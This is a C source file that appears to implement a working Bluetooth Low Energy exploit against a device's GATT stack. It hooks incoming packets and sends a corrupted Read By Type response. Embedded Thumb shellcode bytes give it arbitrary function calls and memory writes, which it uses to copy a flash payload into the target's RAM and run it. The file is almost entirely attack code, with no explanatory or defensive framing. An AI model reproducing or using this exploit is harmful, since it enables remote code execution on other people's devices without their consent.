#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void *memcpy(void *dest, const void *src, size_t n)
{
	int i;
	for(i = 0; i < n; i++) ((uint8_t*)dest)[i] = ((uint8_t*)src)[i];
	return dest;
}

void *memset(void *s, int c, size_t n)
{
	int i;
	for(i = 0; i < n; i++) ((uint8_t*)s)[i] = (uint8_t)c;
	return s;
}

void* g_handle = NULL;
int (*g_send_packet)(void*, void*, int) = NULL;
int g_counter = 0;

#define outbound_queue_length 0x100
uint8_t outbound_queue[outbound_queue_length][0x17];
uint8_t outbound_queue_lengths[outbound_queue_length];
int outbound_queue_cursor = 0;
int outbound_queue_num = 0;

int ble_outbound_push(void* buffer, int length)
{
	if(outbound_queue_num < outbound_queue_length)
	{
		int cursor = (outbound_queue_cursor + outbound_queue_num) % outbound_queue_length;
		memcpy(outbound_queue[cursor], buffer, length);
		outbound_queue_lengths[cursor] = length;
		outbound_queue_num++;
		
		return 0;
	}
	
	return -1;
}

int ble_outbound_pop(void** buffer, int* length)
{
	if(outbound_queue_num > 0)
	{
		if(buffer) *buffer = outbound_queue[outbound_queue_cursor];
		if(length) *length = outbound_queue_lengths[outbound_queue_cursor];
		
		outbound_queue_cursor = (outbound_queue_cursor + 1) % outbound_queue_length;
		outbound_queue_num--;
		
		return 0;
	}
	
	return -1;
}

int ble_outbound_cancel_pop()
{
	if(outbound_queue_num >= outbound_queue_length) return -1;
	
	outbound_queue_cursor--;
	while(outbound_queue_cursor < 0) outbound_queue_cursor += outbound_queue_length;
	outbound_queue_num++;
	
	return 0;
}

void vuln_funccall(uint32_t pc, uint32_t r0, uint32_t r1, uint32_t r2, uint8_t* data, int length)
{
	static uint8_t response_buffer[0x17];
	
	if(length > sizeof(response_buffer) - 1) length = sizeof(response_buffer) - 1;
	
	// magic number: if we find it, we replace it with the address of the data buffer
	if(r0 == 0xdeadbabe) r0 = 0x20002464;
	if(r1 == 0xdeadbabe) r1 = 0x20002464;
	if(r2 == 0xdeadbabe) r2 = 0x20002464;
	
	// payload packets!
	// function call shellcode (meant for arbitrary memcpy)
		//	add r4, pc, #0x44
		//	ldmia r4!, {r0-r3}
		//	blx r3
		//  ; the following is needed so that we can send more vuln-triggering packets
		//	ldr r0, =0x20001EB2
		//	mov r1, #0x10
		//	strb r1, [r0]
		//	add sp, #0x54
		//	pop {r4-r7,pc}
	memset(response_buffer, 0xbe, sizeof(response_buffer));
	memcpy(response_buffer, (uint8_t[]){0x11, 0xA4, 0x0F, 0xCC, 0x98, 0x47, 0x02, 0x48, 0x10, 0x21, 0x01, 0x70, 0x15, 0xB0, 0xF0, 0xBD, 0xB2, 0x1E, 0x00, 0x20}, 0x14);
	ble_outbound_push(response_buffer, sizeof(response_buffer));
	
	memset(response_buffer, 0xba, sizeof(response_buffer));
	if(data) memcpy(&response_buffer[1], data, length);
	ble_outbound_push(response_buffer, sizeof(response_buffer));
	
	// payload-alignment packet!
	// we actually have two alignment requirements: one is that the first instruction address be thumb-aligned (ie lsb is set)
	// the second is that we have a memcpy at 0x53A8 which is optimized for alignment so address there needs to be 4-aligned
	memset(response_buffer, 0xb0, sizeof(response_buffer));
	memcpy(&response_buffer[2], (uint32_t[]){r0, r1, r2, pc}, 0x10);
	ble_outbound_push(response_buffer, 0x15);

	// read by type request - return a corrupted read by type response
	memset(response_buffer, 0xDA, sizeof(response_buffer));
	
	// read by type response
	response_buffer[0] = 0x09;
	// read by type response length
	response_buffer[1] = 0x01;
	
	// SBZ to avoid issues - replaces conn_handle on the stack
	*(uint16_t*)&response_buffer[0x10] = 0x00;
	
	// first two payload instructions
	// memcpy(&response_buffer[0x13], (uint8_t[]){0x00, 0xbe}, 2); // bkpt 0
	// memcpy(&response_buffer[0x13], (uint8_t[]){0x15, 0xB0, 0xF0, 0xBD}, 4); // add sp, 0x54; pop {r4-r7,pc}; (continues execution on target as if nothing happened)
	memcpy(&response_buffer[0x13], (uint8_t[]){0xC1, 0xE7}, 2); // b 0x20002440
	
	ble_outbound_push(response_buffer, sizeof(response_buffer));
}

void vuln_arbwrite(uint32_t dst, uint8_t* data, int length)
{
	vuln_funccall(/*memcpy*/ 0x1B1CD, /*dst*/ dst, /*src*/ 0xdeadbabe, /*len*/ length, data, length);
}

extern unsigned char flash_payload[];
extern const unsigned int flash_payload_size;

void vuln_largewrite(uint32_t address, uint8_t* buffer, int length)
{
	int cursor = 0;
	const int stride = 0x16;
	
	while(cursor < length)
	{
		int sub_length = length - cursor;
		if(sub_length > stride) sub_length = stride;

		vuln_arbwrite(address + cursor, &buffer[cursor], sub_length);
		
		cursor += stride;
	}
}

const uint32_t payload_address = 0x20003C00;

void ble_outgoing_hook(uint8_t* buffer, unsigned int length)
{	
	// log_packet(buffer, length, 1);
	
	if(g_send_packet)
	{
		void* buffer = NULL;
		int length = 0;
		
		if(!ble_outbound_pop(&buffer, &length))
		{
			if(g_send_packet(g_handle, buffer, length)) ble_outbound_cancel_pop();
		}
	}
}

// return non-0 to skip normal incoming packet processing
int ble_incoming_hook(uint8_t* buffer, uint16_t length, void* handle, int (*send_packet)(void*, void*, int))
{
	// log_packet(buffer, length, 0);
		
	g_handle = handle;
	g_send_packet = send_packet;
	
	uint16_t cid = *(uint16_t*)&buffer[5];
	uint8_t gatt_type = buffer[7];
	if(cid == 0x0004 && gatt_type == 0x08)
	{
		static uint8_t response_buffer[0x17];
		
		// filler packets! use these to wrap around the ring buffer
		// only needed the first time, the packet sizes we picked below wrap around exactly once
		memset(response_buffer, 0xde, sizeof(response_buffer));
		send_packet(handle, response_buffer, sizeof(response_buffer));
		send_packet(handle, response_buffer, sizeof(response_buffer));
		send_packet(handle, response_buffer, sizeof(response_buffer));
		
		const uint32_t payload_main = (payload_address + ((uint16_t*)flash_payload)[0]) | 1;
		
		vuln_largewrite(payload_address, flash_payload, flash_payload_size);
		
		vuln_funccall(payload_main, 0, 0, 0, NULL, 0);
		
		return 1;
	}
	
	return 0;
}
